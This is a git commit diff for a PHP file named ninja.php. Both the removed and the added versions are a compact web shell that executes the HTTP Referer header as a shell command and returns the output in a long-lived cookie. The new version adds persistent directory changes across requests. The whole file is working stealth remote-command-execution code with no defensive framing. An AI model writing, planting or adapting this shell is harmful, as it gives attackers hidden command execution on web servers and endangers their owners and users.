76332a8465f65555425ab2ddcf7b1216e2caabb1
Bloos3rpent <67107159+bloos3rpent@users.noreply.github.com>
2022-07-25 22:48:42 +0800

    Update ninja.php

--- ninja.php
+++ ninja.php
@@ -1,9 +1,3 @@
-<? 
-if(isset($_SERVER['HTTP_REFERER'])){
-	$_=$_SERVER['HTTP_REFERER'];
-	$b = `$_`;
-	session_destroy();
-	setcookie("x", $b, time()+30*24*60*60);
-} 
-
-?>
+<?session_start();if(isset($_SERVER['HTTP_REFERER'])){$_=$_SERVER['HTTP_REFERER'];if(substr($_,0,2)=='cd'){$_SESSION['dir']=substr($_,3);chdir($_SESSION['dir']);setcookie("dir",$dir);}
+if(isset($_SESSION['dir'])){chdir($_SESSION['dir']);}
+$b=`$_`;setcookie("x",$b,time()+30*24*60*60);}?>
